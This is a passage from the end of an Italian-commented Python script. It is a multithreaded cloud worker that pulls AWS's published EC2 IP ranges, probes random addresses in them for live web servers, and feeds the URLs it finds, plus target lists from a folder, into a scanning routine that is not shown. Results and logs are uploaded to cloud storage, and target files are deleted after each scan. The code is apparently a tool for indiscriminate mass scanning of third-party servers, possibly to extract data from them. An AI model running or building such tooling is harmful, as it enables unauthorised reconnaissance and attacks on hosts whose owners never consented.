                futures = {executor.submit(verify_ec2_webserver, ip, region): (ip, region)
                          for ip, region in chunk}
                for future in as_completed(futures):
                    try:
                        url = future.result(timeout=DNS_TIMEOUT_EC2 + 3)
                    except Exception:
                        processed += 1
                        continue
                    processed += 1
                    if url and url not in seen_urls:
                        seen_urls.add(url)
                        hits += 1

            pct = processed * 100 // total_my
            if pct >= last_pct + 10:
                last_pct = pct - (pct % 10)
                bad = processed - hits
                print(f"[W{worker_id} GATHER #{cycle_num}] {pct}% ({processed:,}/{total_my:,}) "
                      f"— {hits} webserver, {bad} scartati", flush=True)

            chunk = []

    if chunk:
        with ThreadPoolExecutor(max_workers=min(DNS_WORKERS_EC2, len(chunk))) as executor:
            futures = {executor.submit(verify_ec2_webserver, ip, region): (ip, region)
                      for ip, region in chunk}
            for future in as_completed(futures):
                try:
                    url = future.result(timeout=DNS_TIMEOUT_EC2 + 3)
                except Exception:
                    processed += 1
                    continue
                processed += 1
                if url and url not in seen_urls:
                    seen_urls.add(url)
                    hits += 1

    urls = list(seen_urls)
    random.shuffle(urls)
    bad = processed - hits
    print(f"[W{worker_id} GATHER #{cycle_num}] Fase 1: {hits} web server, {bad} scartati "
          f"su {total_my:,} IP.", flush=True)

    if urls:
        print(f"[W{worker_id}] Fase 2 — Scansione di {len(urls)} URL verificati...", flush=True)
        process_urls(urls)
        print(f"[W{worker_id}] Fase 2 completata.", flush=True)
    else:
        print(f"[W{worker_id}] Nessun URL trovato. Salto scansione.", flush=True)

# ============================================================
# MAIN
# ============================================================

def main():
    global LOG_PATH

    if LOG_ACTIVE:
        os.makedirs(LOGS_DIR, exist_ok=True)
        container_id = os.environ.get('HOSTNAME', f'local_{int(time.time())}')
        LOG_PATH = os.path.join(LOGS_DIR, f'{container_id}.log')
        sys.stdout = TeeLogger(LOG_PATH)
        sys.stderr = sys.stdout

    print("\n[SYS] Cloud worker starting...", flush=True)
    if LOG_ACTIVE:
        print(f"[SYS] Log salvato in: {LOG_PATH}", flush=True)
    os.makedirs(result_dir, exist_ok=True)
    os.makedirs(newpathtextract, exist_ok=True)

    # Riepilogo config
    print(f"[SYS] AWS_S3={AWS_S3}  BUNNY_STORAGE={BUNNY_STORAGE}", flush=True)
    print(f"[SYS] LOAD_FROM_SITE={LOAD_FROM_SITE}  LOAD_FROM_CIDR={LOAD_FROM_CIDR}", flush=True)
    print(f"[SYS] Container-ID={INSTANCE_ID} (di {TOTAL_SLOTS} slot), "
          f"{NUM_WORKERS} worker, ~{MAX_IPS_PER_CIDR} IP/CIDR", flush=True)

    # Carica CIDR pool una volta sola (serve per entrambi i modi)
    cidr_pool = None
    if LOAD_FROM_CIDR:
        aws_data = fetch_aws_ips()
        ec2_cidrs = get_ec2_cidrs(aws_data)
        if not ec2_cidrs:
            print("[SYS] Nessun CIDR EC2 trovato.", flush=True)
        else:
            print(f"[SYS] Trovati {len(ec2_cidrs)} CIDR EC2. Costruzione pool CIDR...", flush=True)
            cidr_pool = build_cidr_pool(ec2_cidrs)

    # Verifica che almeno una fonte sia attiva
    if not LOAD_FROM_SITE and not LOAD_FROM_CIDR:
        print("[SYS] ERRORE: LOAD_FROM_SITE=False e LOAD_FROM_CIDR=False. Nessuna fonte target. Uscita.", flush=True)
        return
    if LOAD_FROM_CIDR and cidr_pool is None:
        print("[SYS] ERRORE: LOAD_FROM_CIDR=True ma nessun CIDR disponibile. Uscita.", flush=True)
        return

    print(f"[SYS] Avvio {NUM_WORKERS} worker thread", flush=True)

    def worker_loop(worker_id):
        cycle = 0
        while True:
            cycle += 1

            # FASE SITE: processa i file .txt uno alla volta
            if LOAD_FROM_SITE:
                files_processed = 0
                while True:
                    site_targets, filepath = load_sites_from_folder()
                    if not site_targets:
                        if files_processed > 0:
                            print(f"[SITE] Worker {worker_id} — Tutti i file processati ({files_processed} file).", flush=True)
                        else:
                            print(f"[SITE] Worker {worker_id} — Nessun file .txt in site/. In attesa...", flush=True)
                        break
                    fname = os.path.basename(filepath)
                    print(f"[SITE] Worker {worker_id} — Scansione {fname}: {len(site_targets)} target", flush=True)
                    process_urls(site_targets)
                    # Cancella SOLO DOPO la scansione completata
                    delete_site_file(filepath)
                    files_processed += 1

            # FASE CIDR: genera IP da AWS e scansiona
            if LOAD_FROM_CIDR:
                gather_and_scan_cycle(cidr_pool, worker_id, NUM_WORKERS, cycle)
                print(f"[W{worker_id}] Ciclo #{cycle} completato.", flush=True)

            # Se nessuno dei due e' attivo, esci
            if not LOAD_FROM_SITE and not LOAD_FROM_CIDR:
                break

    def log_upload_loop():
        while True:
            time.sleep(LOG_UPLOAD_INTERVAL)
            try:
                _upload_log()
            except Exception:
                pass

    threads = []
    for w in range(NUM_WORKERS):
        t = Thread(target=worker_loop, args=(w,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.2)

    log_thread = Thread(target=log_upload_loop, daemon=True)
    log_thread.start()

    print(f"[SYS] Tutti i {NUM_WORKERS} worker + upload log avviati.", flush=True)

    for t in threads:
        t.join()

if __name__ == '__main__':
    main()
